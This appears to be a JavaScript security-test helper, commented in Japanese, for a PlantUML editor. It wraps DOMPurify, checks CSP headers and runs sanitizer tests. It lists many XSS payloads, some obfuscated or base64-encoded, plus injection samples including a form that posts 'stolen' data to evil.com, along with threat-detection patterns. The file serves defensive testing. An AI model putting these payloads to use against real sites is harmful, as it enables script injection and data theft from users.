/**
 * セキュリティテスト専用ヘルパー
 * DOMPurifyとCSP検証のためのユーティリティ
 * 
 * Sprint 1.5 - SEC-003 XSS脆弱性テスト完全実装版
 * 作成日: 2025-08-15 (更新)
 * 作成者: webapp-test-automation
 */

import DOMPurify from 'dompurify';
import { JSDOM } from 'jsdom';

// JSDOMの初期化（テスト環境用）
let window, purify;
if (typeof window === 'undefined') {
  const dom = new JSDOM('<!DOCTYPE html><html><body></body></html>');
  window = dom.window;
  global.window = window;
  global.document = window.document;
  purify = DOMPurify(window);
} else {
  purify = DOMPurify;
}

/**
 * DOMPurifyテスト用ヘルパー（拡張版）
 * 実際のDOMPurifyライブラリと統合したモック実装
 */
export const mockDOMPurify = {
  /**
   * 実際のDOMPurifyを使用したサニタイゼーション
   */
  sanitize(input, options = {}) {
    // null/undefinedチェック
    if (input === null || input === undefined) {
      return '';
    }
    
    // 文字列型チェック
    if (typeof input !== 'string') {
      return '';
    }
    
    // デフォルトオプション設定
    const defaultOptions = {
      ALLOWED_TAGS: ['p', 'div', 'span', 'strong', 'em', 'b', 'i', 'br', 'ul', 'ol', 'li'],
      ALLOWED_ATTR: ['class', 'id'],
      KEEP_CONTENT: true,
      STRIP_HTML: false
    };
    
    const mergedOptions = { ...defaultOptions, ...options };
    
    // HTML完全除去モード
    if (mergedOptions.STRIP_HTML) {
      return input.replace(/<[^>]*>/g, '');
    }
    
    try {
      // 実際のDOMPurifyでサニタイズ
      const sanitized = purify.sanitize(input, mergedOptions);
      return sanitized;
    } catch (error) {
      console.error('DOMPurify sanitization error:', error);
      return '';
    }
  },

  /**
   * サニタイゼーション結果の検証
   */
  isClean(input) {
    if (!input || typeof input !== 'string') {
      return true;
    }
    
    const sanitized = this.sanitize(input);
    return sanitized === input;
  },

  /**
   * 設定可能なフックのモック（拡張版）
   */
  hooks: {
    beforeSanitizeElements: [],
    afterSanitizeElements: [],
    beforeSanitizeAttributes: [],
    afterSanitizeAttributes: []
  },

  addHook(hookName, callback) {
    if (this.hooks[hookName]) {
      this.hooks[hookName].push(callback);
    }
  },

  removeHook(hookName) {
    if (this.hooks[hookName]) {
      this.hooks[hookName] = [];
    }
  },

  /**
   * 危険パターンの検出
   */
  detectThreats(input) {
    const threats = [];
    
    // スクリプトタグ検出
    if (/<script[^>]*>/i.test(input)) {
      threats.push('SCRIPT_TAG');
    }
    
    // イベントハンドラー検出
    if (/on\w+\s*=/i.test(input)) {
      threats.push('EVENT_HANDLER');
    }
    
    // JavaScriptプロトコル検出
    if (/javascript\s*:/i.test(input)) {
      threats.push('JAVASCRIPT_PROTOCOL');
    }
    
    // データURIスキーム検出
    if (/data\s*:\s*text\/html/i.test(input)) {
      threats.push('DATA_URI_HTML');
    }
    
    // Base64エンコード検出
    if (/base64\s*,/i.test(input)) {
      threats.push('BASE64_ENCODING');
    }
    
    return threats;
  }
};

/**
 * CSP（Content Security Policy）テストヘルパー（拡張版）
 */
export const cspTestHelpers = {
  /**
   * CSPヘッダーの検証
   */
  validateCSPHeader(cspString) {
    const policies = cspString.split(';').map(p => p.trim());
    const validatedPolicies = {};

    policies.forEach(policy => {
      const [directive, ...values] = policy.split(' ');
      if (directive) {
        validatedPolicies[directive] = values;
      }
    });

    return validatedPolicies;
  },

  /**
   * CSP違反の検出テスト（拡張版）
   */
  testCSPViolation(directive, source) {
    const violations = [];

    // script-src違反
    if (directive === 'script-src') {
      if (source.includes('unsafe-inline') && source.includes('<script>')) {
        violations.push('Inline script detected with unsafe-inline');
      }
      if (source.includes('unsafe-eval') && (source.includes('eval(') || source.includes('Function('))) {
        violations.push('eval() usage detected with unsafe-eval');
      }
      if (source.includes('data:') && source.includes('text/html')) {
        violations.push('Data URI HTML content detected');
      }
    }

    // style-src違反
    if (directive === 'style-src') {
      if (source.includes('unsafe-inline') && source.includes('style=')) {
        violations.push('Inline style detected with unsafe-inline');
      }
    }

    // img-src違反
    if (directive === 'img-src') {
      if (source.includes('javascript:')) {
        violations.push('JavaScript protocol in image source');
      }
    }

    return violations;
  },

  /**
   * 推奨CSP設定の生成（強化版）
   */
  generateRecommendedCSP() {
    return {
      'default-src': ["'self'"],
      'script-src': ["'self'", "'unsafe-hashes'"],
      'style-src': ["'self'", "'unsafe-inline'"],
      'img-src': ["'self'", 'data:', 'https:'],
      'font-src': ["'self'", 'https:'],
      'connect-src': ["'self'"],
      'frame-ancestors': ["'none'"],
      'frame-src': ["'none'"],
      'object-src': ["'none'"],
      'media-src': ["'self'"],
      'manifest-src': ["'self'"],
      'worker-src': ["'self'"],
      'base-uri': ["'self'"],
      'form-action': ["'self'"],
      'upgrade-insecure-requests': []
    };
  }
};

/**
 * セキュリティ脅威パターンジェネレーター（大幅拡張版）
 */
export const threatPatterns = {
  /**
   * XSS攻撃パターン（レベル別・拡張版）
   */
  xss: {
    // 基本的なXSSパターン
    basic: [
      '<script>alert("XSS")</script>',
      '<script>console.log("XSS")</script>',
      '<script src="malicious.js"></script>',
      '<img src=x onerror=alert("XSS")>',
      '<svg onload=alert("XSS")>',
      '<iframe src="javascript:alert(\'XSS\')"></iframe>',
      '"><script>alert("XSS")</script>',
      '\';alert("XSS");//'
    ],

    // 高度なXSSパターン
    advanced: [
      '"><script>alert(String.fromCharCode(88,83,83))</script>',
      '<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4="></object>',
      '<embed src="data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=">',
      '<link rel="stylesheet" href="javascript:alert(\'XSS\')">',
      '<meta http-equiv="refresh" content="0;url=javascript:alert(\'XSS\')">',
      '<form action="javascript:alert(\'XSS\')"><input type="submit"></form>',
      '<math><mi//xlink:href="data:x,<script>alert(\'XSS\')</script>">',
      '<details ontoggle=alert(\'XSS\')>'
    ],

    // 難読化XSSパターン
    obfuscated: [
      '<img src=x oneRRor="&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;">',
      '<svg><script>alert&#40;1&#41;</script></svg>',
      '<script>eval(atob("YWxlcnQoJ1hTUycp"))</script>',
      '<script>eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))</script>',
      '<script>window[\'eval\'](\'alert("XSS")\')</script>',
      '<img src="x" onerror="eval(\'alert(\\\'XSS\\\')\')">',
      '<svg onload="&#x61;&#x6C;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;">',
      '<script>Function(\'alert("XSS")\')()</script>'
    ],

    // SVG/MathMLベースの攻撃
    svg: [
      '<svg onload="alert(\'XSS\')">',
      '<svg><script>alert(\'XSS\')</script></svg>',
      '<svg xmlns:xlink="http://www.w3.org/1999/xlink"><image xlink:href="javascript:alert(\'XSS\')"/>',
      '<svg><foreignObject><script>alert(\'XSS\')</script></foreignObject></svg>',
      '<svg><use xlink:href="data:image/svg+xml,<script>alert(\'XSS\')</script>"/>',
      '<math><mi xlink:href="data:x,<script>alert(\'XSS\')</script>">test</mi></math>',
      '<svg><animate onbegin="alert(\'XSS\')"></animate></svg>'
    ],

    // データURIスキーム攻撃
    dataUri: [
      'data:text/html,<script>alert("XSS")</script>',
      'data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=',
      'data:image/svg+xml,<svg onload="alert(\'XSS\')">',
      'data:application/x-javascript,alert("XSS")',
      'data:text/xml,<script>alert("XSS")</script>',
      'data:application/xml,<script xmlns="http://www.w3.org/1999/xhtml">alert("XSS")</script>',
      'data:text/html;charset=utf-7,+ADw-script+AD4-alert(+ACc-XSS+ACc-)+ADsAPA-/script+AD4-'
    ]
  },

  /**
   * HTMLインジェクションパターン（拡張版）
   */
  htmlInjection: [
    '<h1>Injected Content</h1>',
    '<div style="position:absolute;top:0;left:0;width:100%;height:100%;background:red;">Overlay</div>',
    '<form action="http://evil.com" method="post"><input type="hidden" name="data" value="stolen"></form>',
    '<style>body{display:none !important;}</style>',
    '<base href="http://evil.com/">',
    '<meta charset="utf-7">',
    '<title>Hacked Page</title>'
  ],

  /**
   * JavaScriptインジェクションパターン（拡張版）
   */
  jsInjection: [
    'javascript:alert("Injected")',
    'data:text/html,<script>alert("Injected")</script>',
    'vbscript:msgbox("Injected")',
    'livescript:alert("Injected")',
    'mocha:alert("Injected")',
    'javascript:void(0)',
    'data:application/x-javascript,alert("Injected")',
    'jar:http://evil.com!/evil.html'
  ],

  /**
   * イベントハンドラーリスト（完全版）
   */
  eventHandlers: [
    'onload', 'onerror', 'onclick', 'onmouseover', 'onfocus',
    'onblur', 'onchange', 'onsubmit', 'onreset', 'onselect',
    'onabort', 'onbeforeunload', 'onhashchange', 'onmessage',
    'onoffline', 'ononline', 'onpagehide', 'onpageshow',
    'onpopstate', 'onresize', 'onstorage', 'onunload',
    'onbegin', 'onend', 'onrepeat', 'ontoggle', 'onwheel',
    'ondrag', 'ondrop', 'ondragstart', 'ondragend',
    'oncontextmenu', 'oncopy', 'oncut', 'onpaste',
    'onplay', 'onpause', 'onvolumechange', 'oncanplay',
    'oninput', 'oninvalid', 'onformchange', 'onforminput'
  ],

  /**
   * プロトコル攻撃パターン（拡張版）
   */
  protocols: [
    'javascript:', 'data:', 'vbscript:', 'file:', 'ftp:',
    'jar:', 'ms-its:', 'mhtml:', 'livescript:', 'mocha:',
    'view-source:', 'wyciwyg:', 'res:', 'moz-icon:',
    'chrome:', 'resource:', 'chrome-extension:'
  ]
};

/**
 * セキュリティテスト実行器（大幅拡張版）
 */
export const securityTestRunner = {
  /**
   * XSSテストスイート実行（拡張版）
   */
  runXSSTests(sanitizeFn, testElement) {
    const results = [];
    let totalTests = 0;

    // 全カテゴリのXSSテストを実行
    Object.keys(threatPatterns.xss).forEach(category => {
      if (Array.isArray(threatPatterns.xss[category])) {
        threatPatterns.xss[category].forEach((pattern, index) => {
          totalTests++;
          try {
            const sanitized = sanitizeFn(pattern);
            const threats = mockDOMPurify.detectThreats(sanitized);
            const isClean = threats.length === 0;
            
            results.push({
              test: `${category.toUpperCase()} XSS #${index + 1}`,
              category,
              input: pattern,
              output: sanitized,
              threats,
              passed: isClean,
              message: isClean ? 'XSS blocked successfully' : `XSS threats detected: ${threats.join(', ')}`
            });
          } catch (error) {
            results.push({
              test: `${category.toUpperCase()} XSS #${index + 1}`,
              category,
              input: pattern,
              passed: false,
              error: error.message
            });
          }
        });
      }
    });

    // 成功率計算
    const passedTests = results.filter(r => r.passed).length;
    
    return {
      tests: results,
      summary: {
        total: totalTests,
        passed: passedTests,
        failed: totalTests - passedTests,
        passRate: Math.round((passedTests / totalTests) * 100)
      }
    };
  },

  /**
   * CSPテストスイート実行（拡張版）
   */
  runCSPTests(cspHeader) {
    const results = [];
    const parsedCSP = cspTestHelpers.validateCSPHeader(cspHeader);

    // 必須ディレクティブの確認
    const requiredDirectives = [
      'default-src', 'script-src', 'style-src', 'img-src',
      'connect-src', 'font-src', 'object-src', 'media-src',
      'frame-src', 'frame-ancestors', 'base-uri', 'form-action'
    ];
    
    requiredDirectives.forEach(directive => {
      const hasDirective = directive in parsedCSP;
      results.push({
        test: `Required directive: ${directive}`,
        passed: hasDirective,
        message: hasDirective ? `${directive} is configured` : `${directive} is missing`,
        severity: hasDirective ? 'LOW' : 'MEDIUM'
      });
    });

    // 危険な設定の検出
    const dangerousSettings = [
      { directive: 'script-src', value: "'unsafe-eval'", severity: 'HIGH' },
      { directive: 'script-src', value: "'unsafe-inline'", severity: 'MEDIUM' },
      { directive: 'style-src', value: "'unsafe-inline'", severity: 'LOW' },
      { directive: 'default-src', value: "*", severity: 'HIGH' },
      { directive: 'script-src', value: "*", severity: 'CRITICAL' }
    ];

    dangerousSettings.forEach(({ directive, value, severity }) => {
      if (parsedCSP[directive] && parsedCSP[directive].includes(value)) {
        results.push({
          test: `Dangerous setting: ${directive} ${value}`,
          passed: false,
          message: `${value} detected in ${directive} - SECURITY RISK`,
          severity
        });
      }
    });

    return results;
  },

  /**
   * 統合セキュリティテスト（大幅拡張版）
   */
  runComprehensiveSecurityTest(sanitizeFn, cspHeader, testElement) {
    const results = {
      xss: this.runXSSTests(sanitizeFn, testElement),
      csp: this.runCSPTests(cspHeader),
      timestamp: new Date().toISOString()
    };

    // 総合評価
    const xssTests = results.xss.tests;
    const cspTests = results.csp;
    const allTests = [...xssTests, ...cspTests];
    const passedTests = allTests.filter(test => test.passed).length;
    const totalTests = allTests.length;

    // 重要度別集計
    const criticalIssues = allTests.filter(t => !t.passed && t.severity === 'CRITICAL').length;
    const highIssues = allTests.filter(t => !t.passed && t.severity === 'HIGH').length;
    const mediumIssues = allTests.filter(t => !t.passed && t.severity === 'MEDIUM').length;

    results.summary = {
      totalTests,
      passedTests,
      failedTests: totalTests - passedTests,
      passRate: Math.round((passedTests / totalTests) * 100),
      securityRating: this.calculateSecurityRating(passedTests, totalTests, criticalIssues),
      issueBreakdown: {
        critical: criticalIssues,
        high: highIssues,
        medium: mediumIssues,
        low: totalTests - passedTests - criticalIssues - highIssues - mediumIssues
      },
      recommendations: this.generateSecurityRecommendations(results)
    };

    return results;
  },

  /**
   * セキュリティ評価の計算（拡張版）
   */
  calculateSecurityRating(passed, total, criticalIssues = 0) {
    const passRate = passed / total;
    
    // クリティカルな問題が1つでもあれば最低評価
    if (criticalIssues > 0) return 'CRITICAL';
    
    if (passRate >= 0.95) return 'EXCELLENT';
    if (passRate >= 0.85) return 'GOOD';
    if (passRate >= 0.70) return 'ACCEPTABLE';
    if (passRate >= 0.50) return 'POOR';
    return 'CRITICAL';
  },

  /**
   * セキュリティ推奨事項の生成
   */
  generateSecurityRecommendations(results) {
    const recommendations = [];
    
    // XSS対策推奨事項
    if (results.xss.summary.passRate < 90) {
      recommendations.push('XSS防御の強化が必要です。DOMPurifyの設定を見直してください。');
    }
    
    // CSP対策推奨事項
    const cspFailures = results.csp.filter(r => !r.passed);
    if (cspFailures.length > 0) {
      recommendations.push('Content Security Policyの設定を改善してください。');
    }
    
    // 具体的な脅威に対する推奨事項
    const svgThreats = results.xss.tests.filter(t => t.category === 'svg' && !t.passed);
    if (svgThreats.length > 0) {
      recommendations.push('SVGベースのXSS攻撃への対策を強化してください。');
    }
    
    const dataUriThreats = results.xss.tests.filter(t => t.category === 'dataUri' && !t.passed);
    if (dataUriThreats.length > 0) {
      recommendations.push('データURIスキーム攻撃への対策を追加してください。');
    }
    
    return recommendations;
  }
};

/**
 * セキュリティアサーション拡張（大幅拡張版）
 */
export const securityAssertions = {
  /**
   * XSS耐性のアサーション
   */
  toBeXSSResistant(received, patterns = threatPatterns.xss.basic) {
    let passed = true;
    const failures = [];

    patterns.forEach(pattern => {
      if (received.includes(pattern) || mockDOMPurify.detectThreats(received).length > 0) {
        passed = false;
        failures.push(pattern);
      }
    });

    return {
      pass: passed,
      message: () => passed 
        ? `Expected input to NOT be XSS resistant, but it was clean`
        : `Expected input to be XSS resistant, but found vulnerabilities: ${failures.join(', ')}`
    };
  },

  /**
   * HTMLサニタイゼーションのアサーション（拡張版）
   */
  toBeSanitized(received, original) {
    const threats = mockDOMPurify.detectThreats(received);
    const isClean = threats.length === 0;

    return {
      pass: isClean,
      message: () => isClean
        ? `Expected "${received}" to NOT be sanitized`
        : `Expected "${received}" to be properly sanitized. Threats found: ${threats.join(', ')}`
    };
  },

  /**
   * CSP準拠のアサーション（拡張版）
   */
  toComplyWithCSP(received, cspDirectives) {
    const violations = cspTestHelpers.testCSPViolation('script-src', received);
    const isCompliant = violations.length === 0;

    return {
      pass: isCompliant,
      message: () => isCompliant
        ? `Expected content to NOT comply with CSP`
        : `Expected content to comply with CSP, but found violations: ${violations.join(', ')}`
    };
  },

  /**
   * 有効なPlantUMLアクションのアサーション
   */
  toBeValidPlantUMLAction(received) {
    const isValid = received &&
                   typeof received === 'object' &&
                   received.type &&
                   received.content &&
                   received.id &&
                   received.timestamp;

    return {
      pass: isValid,
      message: () => isValid
        ? `Expected object to NOT be a valid PlantUML action`
        : `Expected object to be a valid PlantUML action with type, content, id, and timestamp`
    };
  },

  /**
   * 有効なモーダル状態のアサーション
   */
  toBeValidModalState(received) {
    const isValid = received &&
                   typeof received === 'object' &&
                   typeof received.isOpen === 'boolean' &&
                   typeof received.listeners === 'number';

    return {
      pass: isValid,
      message: () => isValid
        ? `Expected object to NOT be a valid modal state`
        : `Expected object to be a valid modal state with isOpen (boolean) and listeners (number)`
    };
  }
};

/**
 * パフォーマンス測定ヘルパー
 */
export const measurePerformance = async (testName, testFunction) => {
  const startTime = process.hrtime ? process.hrtime.bigint() : Date.now();
  
  let result;
  try {
    if (testFunction.constructor.name === 'AsyncFunction') {
      result = await testFunction();
    } else {
      result = testFunction();
    }
  } catch (error) {
    throw error;
  }
  
  const endTime = process.hrtime ? process.hrtime.bigint() : Date.now();
  const duration = process.hrtime ? 
    Number(endTime - startTime) / 1_000_000 : // ナノ秒からミリ秒
    endTime - startTime; // 既にミリ秒
  
  // 5秒制限のチェック（CLAUDE.md基準）
  if (duration > 5000) {
    console.warn(`Performance warning: ${testName} took ${duration.toFixed(2)}ms (> 5000ms)`);
  }
  
  return result;
};

/**
 * テスト用DOM要素作成・管理ヘルパー
 */
export const createTestDOM = () => {
  if (typeof document === 'undefined') {
    throw new Error('DOM environment not available');
  }
  
  // テスト用コンテナの作成
  let testContainer = document.getElementById('plantuml-editor');
  if (!testContainer) {
    testContainer = document.createElement('div');
    testContainer.id = 'plantuml-editor';
    testContainer.innerHTML = `
      <div id="japanese-input" data-testid="japanese-input"></div>
      <div id="plantuml-output" data-testid="plantuml-output"></div>
      <div id="test-container" data-testid="test-container"></div>
    `;
    document.body.appendChild(testContainer);
  }
  
  return testContainer;
};

export const cleanupTestDOM = () => {
  if (typeof document !== 'undefined') {
    const testContainer = document.getElementById('plantuml-editor');
    if (testContainer) {
      testContainer.remove();
    }
    
    // その他のテスト用要素のクリーンアップ
    const testElements = document.querySelectorAll('[data-testid]');
    testElements.forEach(element => {
      if (element.parentNode && element.id !== 'plantuml-editor') {
        element.remove();
      }
    });
  }
};

/**
 * PlantUMLイベント作成ヘルパー
 */
export const createPlantUMLEvent = (eventType, detail = {}) => {
  return new CustomEvent(eventType, {
    detail,
    bubbles: true,
    cancelable: true
  });
};

/**
 * 非同期処理待機ヘルパー
 */
export const waitForAsync = async (condition, timeout = 1000) => {
  const startTime = Date.now();
  
  while (Date.now() - startTime < timeout) {
    if (await condition()) {
      return true;
    }
    await new Promise(resolve => setTimeout(resolve, 10));
  }
  
  return false;
};

// Jest環境でカスタムマッチャーを拡張
if (typeof expect !== 'undefined' && expect.extend) {
  expect.extend(securityAssertions);
}